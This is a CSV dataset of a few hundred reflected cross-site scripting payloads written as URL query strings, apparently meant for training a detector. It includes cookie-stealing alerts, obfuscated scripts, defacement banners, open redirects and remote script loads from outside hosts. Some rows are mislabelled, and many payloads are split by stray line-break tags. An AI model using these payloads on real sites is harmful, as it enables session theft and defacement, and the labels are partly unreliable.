Payload,Label
target=xt_downloadCheckout.asp&pf_id=%22%3E%3CBO<br/>DY/ONLOAD=alert(/XSS/)%3E&dept_id=&attr_value1=&attr_value2=&attr_value3=&attr_value4=&attr_value5=&<br/>Validate=&shopper_email=&shopper_password=&shopper_password2=&shopper_first_name=&shopper_last_name=<br/>&shopper_street=&shopper_street2=&shopper_city=&shopper_state=&shopper_zip=&shopper_country=1&shoppe<br/>r_phone=&SUBMIT.x=76&SUBMIT.y=8&SUBMIT=Register,1
_a=knowledgebase&_j=questiondetails&_i=wawa'><script>alert(123)</s<br/>cript>,1
"id=""></a><script>alert(document.cookie);</sc<br/>ript>",1
"lng=""><script>alert('By_TurKpoweR')</script><h1>HACKED-By-TurKPoweR",1
band_id=872&sfid=2&submitted=%22%3E%3CBODY/ONL<br/>OAD=alert(/XSS/)%3E,1
_a=knowledgebase,1
"kelime=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,121,1<br/>01,75,66,69,82,85,113,65,78))%3C/script%3E",1
"kl=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,121,10<br/>1,75,66,69,82,85,113,65,78))%3C/script%3E",1
keyword=%3Cscript%3Ealert(123)%3C/script%3E%3Cmarquee%3E%3<br/>Ch1%3EZeryus%20was%20here%20!%3C/h1%3E%3C/marquee%3E,1
"url=""><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPow<br/>eR",1
q=%22%3e<h1>HaCKeD%20By%20TurKPoweR,1
"query=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,121<br/>,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
FE[fe_users][username]=\')<br/>;z=/alert(%2527xss%2527)/;eval(unescape(z.source))//,1
"ref=""><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPo<br/>weR",1
action=AddTicket&C<br/>lientType=Tickets&ActionL=1&User=269158&Order=69636737,1
search=%22%3E%3Cscript%3Ealert(%22DeFaCeD%20bY%20Sp<br/>OnSFull%22);%3C/script%3E,1
query=%3Cscript%3Ealert%28%22Zeryus%22%29%3C%2Fscript%3E%3Cmarquee%3<br/>E%3Ch1%3EZeryus+was+here+%21%3C%2Fh1%3E%3C%2Fmarquee%3E&search=1,1
"q=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,6<br/>6,121,101,75,66,69,82))%3C/script%3E",1
"q=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,121,101,75,66,69,82<br/>,85,113,65,78))%3C/script%3E",1
ps=10&q=i%3Cscript%3Ealert%28String.fromCharCode%2879%2C87%2C78%2C69<br/>%2C68%2C66%2C121%2C101%2C75%2C66%2C69%2C82%29%29%3C%2Fscript%3E&ps=10&m=all&ul=&wf=11FA&cat=&o=0,1
"q=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,121,<br/>101,75,66,69,82,85,113,65,78))%3C/script%3E",1
"C=199&L=20&D=0&searchInput=""><script>alert('By_Tur<br/>KPoweR')</script><h1>HACKED-By-TurKPoweR",1
keyword=%3Cscript%3Ealert(123)%3C/script%3E%3Cmarquee%3E%3Ch1%3EZe<br/>ryus%20was%20here%20!%3C/h1%3E%3C/marquee%3E,1
q=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&sa=Search,1
"q=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,6<br/>8,66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
url=<script>alert(/XSS/)</script><noscri<br/>pt>,1
sender_name=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&cust_em<br/>ail=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&to_email=customer_service&comment=%22%3E%3Cscript%<br/>3Ealert%281%29%3C%2Fscript%3E&section=contact&send=true,1
mcx=vdesc&instance=top&vname=%22%3E%3Ciframe%20src=htt<br/>p://xssed.com%3E&langname=enu,1
v=3&product=asd&loc=es_es&country=de&platform=2&givenName<br/>=sl4xUz&familyName=sl4xUz&email=%22%3E%3Cscript%3Ealert('xssed');%3C/script%3E&optin=0&serialNumber=<br/>sl4xUz,1
"email=""<script>alert(/XSS/)</script>",1
"id=171&tipUrl=""><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurK<br/>PoweR",1
cx=011125922431339574054%3Axiz-vz-vz5q&q=%3Ciframe+name%3D%2<br/>7%27+SRC%3D%27javascript%3Aalert%28157%29%27+scrolling%3D%27yes%27+height%3D%27220%27+width%3D%27180<br/>%27+FRAMEBORDER%3D%27yes%27%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarq<br/>uee%3E&sa=Rechercher+sur+Aidoforum.com&cof=FORID%3A11,1
visited=true&searchType=advanced&resultStart=1&result<br/>Count=10&SGWID=4-40109-13-0-0&submit.x=27&submit.y=7&queryText=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fvu<br/>ln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.org.js%3E%3C%2Fscript%3E&authorEditor=&isbnIssn=%22%3E%3<br/>Cscript+src%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.org.js%3E%3C%2Fscript%3E&ti<br/>tle=&bookSeries=&publicationComparator=after&publicationYear=&language=&imprint=&topics=&categories=,1
type=1&usr_email=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br/>&usr_name=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Submit=Remind,1
SURVEY=Digitized+Sky+Survey&Position=<script>alert(<br/>/XSS/)</script>,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=com&ima<br/>geField.x=58&imageField.y=14,1
Query='%22%3E%3Ciframe%20src=http://xssed.com%<br/>3E,1
bannerID=50&zoneid=1&s&zoneid=41&source=&dest=http://seym<br/>en.org,1
"pg=64&q=""<script>alert(""XSS"");</script>",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=com&imageField<br/>.x=58&imageField.y=14,1
Text=<script>alert(document.cookie);</script>,1
"url=""><script>alert(/XSS/)</script>",1
bannerid=33&zoneid=1&s&zoneid=41&source=&de<br/>st=http://seymen.org,1
domain=%22%3E%3Cscript%3Ealert%281%<br/>29%3C%2Fscript%3E&ext=com&imageField.x=58&imageField.y=14,1
Error=%3Cscript%3Ealert(/Arash%20RJ%20Was%20Here/)%3C/script%3E,1
"aranacak=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66<br/>,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
yearno=--><script>alert(/XSS/.source)</script>,1
bannerID=44&zoneid=1&s&zoneid=41&source=&dest=http:/<br/>/seymen.org,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=com&im<br/>ageField.x=58&imageField.y=14,1
"search_id=""><script>alert(document.cookie)</script>",1
bannerid=160&zoneid=1&s&zoneid=41&source=&dest<br/>=http://seymen.org,1
msg=%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C/ScRiPt%3E,1
bannerid=4&zoneid=1&s&zoneid=41&source=&dest=http://sey<br/>men.org,1
q=%22%3E%3Cscript%3Ealert(/%20xssed%20by%20k1ll3r_null%20!/)%3C/s<br/>cript%3E%3Ch1%3E%20G.H.S%20!%3C/h1%3E,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&e<br/>xt=com&imageField.x=58&imageField.y=14,1
"query=""><script>alert('By_TurKPoweR')</script><h1>H<br/>ACKED-By-TurKPoweR",1
q=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marqu<br/>ee%3E,1
bannerID=90&zoneid=1&s&zoneid=41&source=&dest=http://sey<br/>men.org,1
"docid=360357&s=a&page=/abstract.aspx?docid=360357%22%20<br/>onclick=alert(String.fromCharCode(88,83,83))%20%22&promo=100202",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=com&imageF<br/>ield.x=58&imageField.y=14,1
"-x<script>alert(""XSS"")</script>",1
mot=%3Cscript%3Ealert%281337%29%3C%2Fscript%<br/>3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&search_go=ok,1
mot=%3Cscript%3Ealert('XSS%20by%20Zer<br/>yus')%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Zeryus%20%3C/h1%3E%3C/marquee%3E,1
mot=%3Cscript%3Ealert%28%27XSS+by+Zeryus%27%29%3C%<br/>2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&id=573,1
mot=%3Cscript%3Ealert%281337%29%3C%2F<br/>script%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&search_go=ok,1
action=keyword_display;keyword=%22%3E%3Cscript%3Ealert(0)%3C/script<br/>%3E,1
"id=""><script>alert(document.cookie)</script>>",1
"auswahl=""><script>alert('HACKED_By_TurKPoweR')<<br/>/script><h1>HACKED-By-TurKPoweR%20/%20turkhackeriz.com",1
s=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E,1
_s=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E<br/>%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&valid_search.x=0&valid_search.y=0,1
entree=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C%2Fmarqu<br/>ee%3E,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&ext=com,1
email=x@wow.com&name=%3Cscript%3Ealert(123)%3C<br/>/script%3E,1
question=HELLO%22;alert('xssed')//,1
page=13&keyword=%22%3E%3Cscript%3Ealert(0)%3C/s<br/>cript%3E,1
q=%3Cscript%3Ealert(document.cookie);%3C/script%3E,1
origen=pie%27%3E%3Cscript%3Ealert(%27XSS%27)%3C/scri<br/>pt%3E,1
segmento=1&parte=0%27)%22%3E%3Ch1%3E%3Ccenter%3EAnoth<br/>er%20XSSs%20in%20a%20%20bank!%20by%20C1c4Tr1Z!%3C/center%3E%3C/h1%3E&opcion=0&url=../banco/ed2007030<br/>5-ZQJM.htm,1
restrict=http%3A%2F%2Fwww.inra.fr%2Fdrh%2F&method=an<br/>d&format=builtin_long&matchesperpages=25&sort=score&config=htsearch_webINRA&exclude=&words=%3Ciframe<br/>+name%3D%27%27+SRC%3D%27javascript%3Aalert%28157%29%27+scrolling%3D%27yes%27+height%3D%27220%27+widt<br/>h%3D%27180%27+FRAMEBORDER%3D%27yes%27%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E<br/>%3C%2Fmarquee%3E&submit=Ok,1
keywords=%3Cscript%3Ealert(document.cookie);%3C/script%3E,1
keyword=%22%3E%3C/iframe%3E%3Cscript%3Ealert('xssed')%3C/s<br/>cript%3E%3C!--,1
"app=""><script>alert('HACKED_By_TurKPoweR')</script><h1>HAC<br/>KED-By-TurKPoweR",1
query=%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C%2Fscript%3E&x=4&y=3,1
segmento=1&parte=0&opcion=0&url=%22%3E%3C/iframe%3E%3<br/>Cscript%3Ealert(%27XSS%20by%20C1c4Tr1Z!!%27)%3C/script%3E,1
apellido=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E&p<br/>os=&nombre=,1
section_site=tout&mois_debut=&annee_debut=&mois_fin=&annee_f<br/>in=&mot_rech=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E<br/>%3C%2Fmarquee%3E&recherche.x=0&recherche.y=0&type=exacte,1
d_keyword=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C%2Fmarquee%<br/>3E,1
"FILE=9697&NUMCORRECT=""><iframe src=""http://xssed.com/""<br/>width=""100%"" height=""100%""></iframe><script>alert(/XSS/)</script>",1
list=cnn-computing&email=<script>alert(/XSS/)</script>,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext<br/>=com&imageField.x=58&imageField.y=14,1
search_string=%22%3E%3Cscript%3Ealert%28String.fromCharCode%<br/>2872%2C65%2C89%2C65%2C76%2C69%2C84%2C75%2C82%2C65%2C76%29%29%3C%2Fscript%3E&newsearch=,1
url=seymen.org,1
ProductSearch=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E&Vendor=<br/>&ProductLine=&OS=&Category=10,1
"id=kuran%22%3E%3Cscript%3Ealert(String.fromCharCode(72,65,89,<br/>65,76,69,84,75,82,65,76))%3C/script%3E",1
researchFirstName=%22%3E%3Cscript%3Ealert%<br/>281%29%3C%2Fscript%3E&researchLastName=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&firstName=%5Bob<br/>ject+HTMLInputElement%5D&lastName=%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E&spellCheck=MEGADEX&dmSou<br/>ndexCode=&site%5B%5D=0&classifications%5B%5D=all,1
quickkey=kxtb2e4hwm3%27//--%3E%3C/script%3E%3Cscript%3Ealert(<br/>%27C1c4Tr1Z%27)%3C/script%3E&thumb=4,1
list=pda&SearchString=%22%3E%3CSCRIPT%3Ealert%28%27XSS_Alert<br/>%27%29%3C%2FSCRIPT%3E,1
keyword=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+<br/>ironzorg%3C%2Fh1%3E%3C%2Fmarquee%3E,1
kw=%3Cscript%3Ealert(31337)%3C/script%3E,1
ie=utf-8&oe=utf-8&hl=en&q=%22%3E%3Cscript%3Ealert%28document<br/>.cookie%29%3B%3C%2Fscript%3E&sitesearch=www.yiparts.com&Submit2=Website+Search,1
searchString=foght\';alert(/xssed/);//&do=fullTextSearch&sub<br/>mit.x=14&submit.y=18&submit=submit,1
q=%3Cscript%3Ealert(%22Zeryus%22)%3C/script%3E,1
keywords=%3Cscript%3Ealert%28%22Find+by+mehdi-es%21%21%21%22%29%3C%2Fs<br/>cript%3E&searchmode=0,1
bannerid=2093&zoneid=1&s&zoneid=41&source=&dest=h<br/>ttp://seymen.org,1
bannerid=412&zoneid=41&source=&dest=http://seymen.org,1
PackageID='%22%22%3E%3C/script%3E%3Cs<br/>cript%3Ealert(1)%3C/script%3E,1
btnSearch=++Search++&q=%3Cscript%3Ealert%28%22Find+by+mehdi-es%21%21%2<br/>1%22%29%3C%2Fscript%3E,1
bid=%22%3E%3Cscript%3Ealert(0)%3C/script%3E,1
termes=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E,1
do=search&language=en&search_content=%22%3E%3C<br/>script%3Ealert%281%29%3C%2Fscript%3E&x=0&y=0&search_boolean=or&search_sort=date_desc,1
search=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%<br/>3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&x=12&y=4,1
cle=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg+for+Xssed.com%3<br/>C%2Fh1%3E%3C%2Fmarquee%3E&method=rapide&GO.x=0&GO.y=0,1
"survey=""><script>alert(""Fugitif"")</script>",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br/>&ext=com&imageField.x=58&imageField.y=14,1
type=2%22%3E%3Cscript%3Ealert(%27XSS%20by%20C1c4Tr1Z%27)%3C/scrip<br/>t%3E,1
Langue=FR&Pays=FR&q=%3Cscript%3Ealert%28%27Infomaroto%27%29%3C%2Fscri<br/>pt%3E,1
mmid=2014&smid=7827,1
"to=search&q=""><script>alert(""Fugitif"")</script>",1
pid=35%22%3E%3Cimg%20src=.%20onerror=alert(/Airroxssed/[<br/>-1]);%3E,1
keyword=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscri<br/>pt%3E&btnG=Search&mtk=uk&enviado=1&s=0&n=10,1
"year=<body onload=""alert('XSS')"">",1
id=%22%3E%3Cscript%3Ealert('Seymen')%3C/script%3E,1
keyword=%3Cscript%3Ealert(123)%3C/script%3E%3Cmarquee%3E%3Ch1%3EZeryus%<br/>20was%20here%20!%3C/h1%3E%3C/marquee%3E,1
q=%22%3E%3Cscript%20src=http://vuln.xssed.net/thirdparty/scr<br/>ipts/ckers.org.js%3E%3C/script%3E,1
email=%3Cscript%3Ealert('genosite');%3C/script%3EE&type=1,1
q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&submit=GO,1
domain=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&<br/>ext=com,1
page=31,1
vh=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&s=ping%21,1
hata=<h1>backdoor<marquee>BackDoor</marquee><script>alert(<br/>document.cookie)</script>,1
action=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=<br/>com&imageField.x=58&imageField.y=14,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&ext=com&imageField.x=58&imageField.y=14,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&<br/>ext=com,1
researchFirstName=%22%3E%3Cscript%3Ealert%28<br/>1%29%3C%2Fscript%3E&researchLastName=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&firstName=%5Bobje<br/>ct+HTMLInputElement%5D&lastName=%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E&spellCheck=MEGADEX&dmSound<br/>exCode=&site%5B%5D=0&classifications%5B%5D=all,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br/>&ext=com,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3<br/>E&ext=com&imageField.x=58&imageField.y=14,1
"ReturnUrl=""><script>alert(/NitrO its here/)</script>",1
"threadprefix=""><script>alert(document.cookie);</script<br/>>",1
"id=""><script>alert(/Shocker @ www.ShockingSoft.com/)</script>",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3<br/>E&ext=com,1
domain=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&ext=c<br/>om,1
v=1%5C%5C%5C%5C&type3_package=3&submit_pack<br/>age=package&aid=&c_code=&submit=Lookup+Domain+%3E%3E&submit_domain=register&new_domain=%5C&new_tld_e<br/>xtension=com&new_domain=%22+onclick=alert(/XSS_by_C1c4Tr1Z/)+%22&tld_extension=com&submit=Lookup+Dom<br/>ain+%3E%3E,1
q=%22%3E%3Cmarquee%3Edefaced%20by%20sponsfull%3C/marquee%3E,1
ref=%22%3E%3Cimg%20src=1.gif%20onerror=javascript:alert(123)<br/>;%3E,1
"username=""><script>alert('XSS')</script>",1
fuseaction=%22%3E%3Cscript%3Ealert(1);%3C/script%3E,1
"enable=dictionary&file=teachers/featured_ar<br/>ticles/20020919thursday.html&encyclopedia=""--><script>alert(/XSS/)</script>",1
sortcode=1.4.4&recherche=%3Ciframe%20name=''%20SR<br/>C='javascript:alert(157)'%20scrolling='yes'%20height='220'%20width='180'%20FRAMEBORDER='yes'%3E%3C/i<br/>frame%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Zeryus%3C/h1%3E%3C/marquee%3E&avancee=or,1
setID=first&urlID=%22%3E%3Cscrip<br/>t%3Ealert(/www.r3t.n3t.nl/)%3C/script%3E,1
who=%3Cimg%20src=%22http://rmccurdy.com/public_images/H4<br/>CK3R54F3.jpg%22%3E,1
keyword=%22%3E%3Cscript%3Ealert(0)%3C/script%<br/>3E,1
vmemid=135&vmemname=%22%3E%3Cscript%3Ealert('seymen'<br/>)%3C/script%3E,1
"vehicle=(((-HOVER OVER TO RUN<br/>SCRIPT-)))&modelid=""onmouseover=alert(/XSS/) foo=""bar",1
keyword=OEM%20hardware&industry=%22%3E%3Cscript%3Ealert(0)%3C/sc<br/>ript%3E,1
country=<script>alert('XSS')</script>,1
lquery=<script>alert(/XSS/)</script>,1
"catid=""><script>alert(""CaspeR"")</script>",1
keywords=%3Ciframe+name%3D%27%27+SRC%3D%27jav<br/>ascript%3Aalert%28157%29%27+scrolling%3D%27yes%27+height%3D%27220%27+width%3D%27180%27+FRAMEBORDER%3<br/>D%27yes%27%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E,1
col=getty&nh=10&qt=%22%27%3E%3Cmarquee%3E%3Ch1%3Ecueballr%<br/>3C%2Fh1%3E%3C%2Fmarquee%3E&SUBMIT.x=0&SUBMIT.y=0,1
"Q=""><script>alert('ZOMG PaPPy Won the<br/>Lottery!');</script>&E=1&X=0",1
urlid=419961&link=http://xssed.com,1
url=%3Cscript%3Ealert(/Zeryus/)%3C/script%3<br/>E%3Ch1%3E%3Cmarquee%3Eby%20Zeryus%3C/h1%3E%3C/marquee%3E,1
q=%3Ciframe+name%3D%27%27+SRC%3D%27javascript%<br/>3Aalert%28157%29%27+scrolling%3D%27yes%27+height%3D%27220%27+width%3D%27180%27+FRAMEBORDER%3D%27yes%<br/>27%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXSS+by+zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&search_button.x=0&<br/>search_button.y=0,1
create=kb:garmin&search='><script>alert('XS<br/>S')</script>,1
FuseAction=PasswordReset&LoginMessage=%3Ciframe%20src=<br/>javascript:alert(123)%3E,1
Member_Name=%22%3E%3Ciframe%20src=javascript:alert(123)%3E&Me<br/>mber_ID=729,1
sur_index=%22%3Cimg%20src=w%20onerror=alert(123)%3E%<br/>22,1
filter.searchTerm=%22'%3E%3Cmarquee%3E%3Ch1%3Ecueballr%<br/>3C/h1%3E%3C/marquee%3E,1
searchStr=<script>alert('XSS')</script>,1
"email=""><script>alert(/Shocker @<br/>www.ShockingSoft.com/)</script>",1
keyword=%3Cscript%3Ealert(%220%22)%3C/script%3E%3Cmarquee%3<br/>E%3Ch1%3EZeryus%20was%20here%20!%3C/h1%3E%3C/marquee%3E,1
keyword=%3Cscript%3Ealert(0)%3C/script%3E%3Cmarquee%3E%3Ch1%3<br/>EZeryus%20was%20here%20!%3C/h1%3E%3C/marquee%3E,1
"p=search&q=""><script>alert(document.cookie)</script>",1
QUERY=%22%27%3E%3Cmarquee%3E%3Ch1%3Ecueballr%3C%2Fh1%3E%3C%2Fm<br/>arquee%3E&STYPE=OR,1
form=presupuesto&ttl=prspt&prdct=1&nmbr=%3Cif<br/>rame%20src=http://xssed.com/%3E,1
q=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+b<br/>y+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&submit2=Rechercher,1
"PHPSESSID=ac68223c9f37571dda471016a50266be&order=""><script>al<br/>ert('HACKED_By_TurKPoweR')</script><h1>HACKED%20By%20TurKPoweR%20/%20turkhackeriz.com..",1
tab=2&movie_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
Movie_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
q=%3Cscript%3Ealert%28%27cool%27%29%3C%2Fscript%<br/>3E&submit=Search+All,1
"theater_id=504&movie_id=screens=1,movieid1=39318&show_date=%<br/>22%3E%3Cscript%3Ealert(1)%3C/script%3E",1
"category=12&CFile=""></a><script>alert(document.cookie);</scr<br/>ipt>",1
s=%22%3C%3Cscript%3Ealert(%22XSSED%20BY%20AZAT%22)%3C/script%<br/>3E,1
"dist=&siteid=""></a><script>alert(document.cookie);</s<br/>cript>",1
t=&fi=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&I1.x=30&I1.y=10,1
%3Cscript%3Ealert(%22XSSED%20BY%20EPIC%22)%3C/script%3E@gmail.com,1
current=1&num=%22%3E%3Cscript%3Ealert(1)%3C/sc<br/>ript%3E,1
"mid=vulnerabilties&act=IS&is_keyword=""><script>alert('noob...')</script>",1
"sw=<script>alert(""Find%20by%20ariarat!!!"")</script>",1
symb=%22');alert(document.cook<br/>ie);//&country=all&type=all,1
username=%5C%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&name<br/>=,1
name=%3Cscript%3Ealert(document.cookie);%3C/scrip<br/>t%3E,1
"keyword=""><script>alert(document.cookie);</script>",1
"query=<script>alert(""Find%20by%20ariarat!!!"")</script>",1
type=%3Cbody%20onload=%22document.write('xss%20by%20rhys')%22%3E,1
"query=%22%3E%3CSCRIPT%3Ealert(String.f<br/>romCharCode(115,101,121,109,101,110))%3C/SCRIPT%3E",1
key=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%<br/>3C%2Fscript%3E&doSearch=Search&e_index_a=on&e_index_b=on&e_index_c=on&e_index_d=on&e_index_e=on&j_e_<br/>index_a=on&j_e_index_b=on&j_e_index_c=on&j_e_index_d=on&lang=E,1
a=add&domain=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(31337<br/>)%3B%3C/ScRiPt%3E,1
bannerid=205&zoneid=1&s&zoneid=41&source=&dest=http://seymen.o<br/>rg,1
"id=%22%3E%3CSCRIPT%3Ealert(String.fromCha<br/>rCode(115,101,121,109,101,110))%3C/SCRIPT%3E",1
message=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
q=%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29<br/>%3B%3C%2Fscript%3E&searchsubmit=,1
msg=%3Cfont%20color=%3Cfont%20color=%22kirmizi%22%3E%3Ch1%3E<br/>%3Cscript%3Ealert(%22xss%22);%3C/script%3E,1
"r=""><h1><script>alert(""Xssed+By+BackDoor"")</script>",1
o=forgot&v=on,1
cat_id=767&fx=event.search&loc_id=<script>alert(document.cookie)</script>,1
"q=%3CSCRIPT%3Ealert(String.fromCharCode(115,101,121,10<br/>9,101,110))%3C/SCRIPT%3E",1
"clave=""><h1>Xss%20by%20n0b0dy</h1>",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ext=co<br/>m&imageField.x=58&imageField.y=14,1
query=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E+<br/>+&uqs=,1
"cat=Arabesk&page=1&sortby=""><script>alert('By_TurKPoweR')</script<br/>><h1>HACKED-By-TurKPoweR",1
"tag=%3Cscript%3Ealert(String.fromCharCode(79,87,78,6<br/>9,68,66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
"search=""><script>alert(1)</script>&Submit=Search",1
s%5Btools.name%5D=<script>alert(document.cookie)</script>,1
bannerid=26&zoneid=1&s&zoneid=41&source=&dest=http://se<br/>ymen.org,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2<br/>Fscript%3E&ext=com&imageField.x=58&imageField.y=14,1
"Mtd=1&StrKey=""><script>alert(""g3"");</script>",1
bannerid=412&zoneid=1&s&zoneid=41&source<br/>=&dest=http://seymen.org,1
words=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C/marquee%3E,1
http://seymen.org,1
menu=<script>alert(document.cookie);</script>,1
k=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C%2Fmarquee%3E&ti<br/>d=1&type=%E7%94%B5%E5%BD%B1&submit=%E6%90%9C%E7%B4%A2,1
